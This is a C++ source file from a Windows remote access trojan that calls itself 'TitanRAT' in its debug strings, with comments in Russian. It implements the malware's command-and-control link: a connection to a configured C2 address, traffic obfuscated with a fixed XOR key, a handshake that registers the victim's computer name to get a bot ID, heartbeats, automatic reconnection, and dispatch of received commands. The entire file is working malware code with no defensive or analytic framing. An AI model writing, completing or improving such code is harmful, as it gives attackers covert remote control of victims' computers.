// Core/network.cpp — FINAL STABLE RECONNECT & THREAD LIFECYCLE
#include "network.h"
#include "persistence.h"
#include "commands.h"
#include <windows.h>
#include <stdio.h>
#include <thread>
#include <mutex>
#include <condition_variable>
#include <queue>
#include <vector>
#include <atomic>
#include <chrono>

// Глобальное состояние
std::string g_bot_id;
const unsigned char XOR_KEY = 0xAA;
SOCKET g_c2_socket = INVALID_SOCKET;

// Прототипы
static void send_all(SOCKET sock, const char* buf, int len);
void sender_loop();

// ==========================================
// ASYNC SEND QUEUE
// ==========================================
struct OutgoingPacket {
    int priority;
    std::vector<uint8_t> data;
    bool operator>(const OutgoingPacket& other) const { return priority > other.priority; }
};

std::priority_queue<OutgoingPacket, std::vector<OutgoingPacket>, std::greater<OutgoingPacket>> g_send_queue;
std::mutex g_queue_mutex;
std::condition_variable g_queue_cv;
std::atomic<bool> g_sender_running{false};
std::thread g_sender_thread;
const unsigned int HEARTBEAT_MS = 5000;

void push_to_send_queue(const std::vector<uint8_t>& data, int priority) {
    std::lock_guard<std::mutex> lock(g_queue_mutex); // ✅ Исправлен синтаксис
    g_send_queue.push({priority, data});
    g_queue_cv.notify_one();
}

void sender_loop() {
    OutputDebugStringA("[TitanRAT] Sender thread STARTED\n");
    auto last_hb = std::chrono::steady_clock::now();

    while (true) {
        std::unique_lock<std::mutex> lock(g_queue_mutex);
        
        // Ждём 1 сек или пока не появятся данные / не попросат выйти
        bool notified = g_queue_cv.wait_for(lock, std::chrono::milliseconds(1000), []{
            return !g_send_queue.empty() || !g_sender_running.load();
        });

        // 🔑 УСЛОВИЕ ВЫХОДА: Если поток остановлен И сокет закрыт И очередь пуста
        if (!g_sender_running.load() && g_c2_socket == INVALID_SOCKET && g_send_queue.empty()) {
            OutputDebugStringA("[TitanRAT] Sender thread EXITED cleanly\n");
            break;
        }

        SOCKET current_sock = g_c2_socket;
        auto now = std::chrono::steady_clock::now();

        // Heartbeat
        if (current_sock != INVALID_SOCKET && 
            std::chrono::duration_cast<std::chrono::milliseconds>(now - last_hb).count() >= HEARTBEAT_MS) {
            
            std::string beat = "pong\n";
            std::vector<uint8_t> enc(beat.begin(), beat.end());
            for (auto& b : enc) b ^= XOR_KEY;
            
            lock.unlock();
            send_all(current_sock, (const char*)enc.data(), (int)enc.size());
            lock.lock();
            last_hb = now;
        }

        // Отправка очереди
        while (!g_send_queue.empty() && current_sock != INVALID_SOCKET) {
            auto pkt = g_send_queue.top();
            g_send_queue.pop();
            lock.unlock();
            send_all(current_sock, (const char*)pkt.data.data(), (int)pkt.data.size());
            lock.lock();
            last_hb = now;
            current_sock = g_c2_socket;
        }
    }
    OutputDebugStringA("[TitanRAT] Sender thread STOPPED\n");
}

void init_network_async() {
    if (g_sender_running.load()) return;
    g_sender_running = true;
    if (g_sender_thread.joinable()) g_sender_thread.join(); // На всякий случай
    g_sender_thread = std::thread(sender_loop);
}

void shutdown_network_async() {
    g_sender_running = false;
    g_c2_socket = INVALID_SOCKET; // 🔑 КРИТИЧНО: сигнализируем потоку о закрытии
    g_queue_cv.notify_all();
    if (g_sender_thread.joinable()) {
        g_sender_thread.join();
    }
}

// ==========================================
// LEGACY NETWORK FUNCTIONS
// ==========================================
bool init_winsock() {
    WSADATA wsa;
    return WSAStartup(MAKEWORD(2, 2), &wsa) == 0;
}

void cleanup_winsock() {
    WSACleanup();
}

SOCKET connect_to_server(const std::string& ip, int port) {
    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) return INVALID_SOCKET;

    u_long mode = 1;
    ioctlsocket(sock, FIONBIO, &mode);

    sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    server.sin_addr.s_addr = inet_addr(ip.c_str());

    connect(sock, (sockaddr*)&server, sizeof(server)); // Non-blocking

    fd_set set; FD_ZERO(&set); FD_SET(sock, &set);
    struct timeval tv = {5, 0}; // 5 сек таймаут

    if (select(0, NULL, &set, NULL, &tv) > 0) {
        int err = 0; int len = sizeof(err);
        getsockopt(sock, SOL_SOCKET, SO_ERROR, (char*)&err, &len);
        if (err == 0) {
            mode = 0;
            ioctlsocket(sock, FIONBIO, &mode);
            DWORD timeout = 5000;
            setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));
            
            g_c2_socket = sock; // 🔑 Сохраняем в глобальную переменную
            init_network_async();
            return sock;
        }
    }
    closesocket(sock);
    return INVALID_SOCKET;
}

static void send_all(SOCKET sock, const char* buf, int len) {
    if (sock == INVALID_SOCKET) return;
    static std::mutex g_send_mutex;
    std::lock_guard<std::mutex> lock(g_send_mutex);
    
    int sent = 0;
    while (sent < len) {
        int n = send(sock, buf + sent, len - sent, 0);
        if (n <= 0) break; // Сокет закрыт или ошибка
        sent += n;
    }
}

void send_encrypted(SOCKET sock, const std::string& data) {
    if (sock == INVALID_SOCKET) return;
    std::vector<uint8_t> enc(data.begin(), data.end());
    for (auto& b : enc) b ^= XOR_KEY;
    enc.push_back(0x0A ^ XOR_KEY);
    push_to_send_queue(enc, 1);
}

std::string recv_encrypted_line(SOCKET sock) {
    // 🔑 Убран static буфер. Теперь каждый вызов читает в локальный стек.
    // Для line-based протокола это безопаснее и исключает "протечку" состояния.
    std::string line;
    char tmp[1];
    
    while (true) {
        int n = recv(sock, tmp, 1, 0);
        if (n == 0) return ""; // Graceful disconnect
        if (n == SOCKET_ERROR) {
            int err = WSAGetLastError();
            if (err == WSAETIMEDOUT || err == WSAEWOULDBLOCK) {
                // Таймаут не считается разрывом. Ждём немного.
                Sleep(50); 
                continue;
            }
            return ""; // Реальная ошибка сети
        }
        
        unsigned char b = tmp[0] ^ XOR_KEY;
        if (b == '\n') return line;
        if (b == '\r') continue;
        line += (char)b;
        if (line.size() > 65536) return ""; // Защита от переполнения
    }
}

void register_with_server(SOCKET sock, const std::string& hostname, std::string& bot_id) {
    std::string hello = "HELLO\n";
    std::vector<uint8_t> enc_hello(hello.begin(), hello.end());
    for (auto& b : enc_hello) b ^= XOR_KEY;
    send_all(sock, (const char*)enc_hello.data(), (int)enc_hello.size());
    
    std::string ack = recv_encrypted_line(sock);
    if (ack != "ACK") return;

    std::string reg = "REGISTER:" + hostname + "\n";
    std::vector<uint8_t> enc_reg(reg.begin(), reg.end());
    for (auto& b : enc_reg) b ^= XOR_KEY;
    send_all(sock, (const char*)enc_reg.data(), (int)enc_reg.size());

    std::string id_line = recv_encrypted_line(sock);
    if (id_line.rfind("ID:", 0) == 0) {
        bot_id = id_line.substr(3);
    }
}

void heartbeat_loop(SOCKET& sock, const Config& cfg) {
    if (g_bot_id.empty()) return;
    
    while (true) {
        std::string resp = recv_encrypted_line(sock);
        
        if (resp.empty()) {
            OutputDebugStringA("[TitanRAT] Connection lost, reconnecting...\n");
            
            // 1. Полная остановка отправщика
            shutdown_network_async();
            
            // 2. Очистка сокета
            if (sock != INVALID_SOCKET) {
                closesocket(sock);
                sock = INVALID_SOCKET;
            }
            g_c2_socket = INVALID_SOCKET; // 🔑 Сброс глобального состояния

            // 3. Цикл реконнекта с задержкой
            bool connected = false;
            for (int attempt = 0; attempt < 10; ++attempt) {
                OutputDebugStringA("[TitanRAT] Connection attempt...\n");
                sock = connect_to_server(cfg.c2_ip, cfg.c2_port);
                if (sock != INVALID_SOCKET) {
                    char hostname[MAX_COMPUTERNAME_LENGTH + 1];
                    DWORD size = sizeof(hostname);
                    GetComputerNameA(hostname, &size);
                    register_with_server(sock, hostname, g_bot_id);
                    
                    if (!g_bot_id.empty()) {
                        connected = true;
                        OutputDebugStringA("[TitanRAT] Reconnected & Registered.\n");
                        break;
                    }
                    // Регистрация не прошла -> закрываем и пробуем снова
                    closesocket(sock);
                    sock = INVALID_SOCKET;
                    g_c2_socket = INVALID_SOCKET;
                }
                Sleep(3000);
            }
            
            if (!connected) {
                sock = INVALID_SOCKET;
                g_c2_socket = INVALID_SOCKET;
                continue;
            }
            continue; // Успех -> идём в recv_encrypted_line
        }
        
        process_command(resp, sock);
    }
}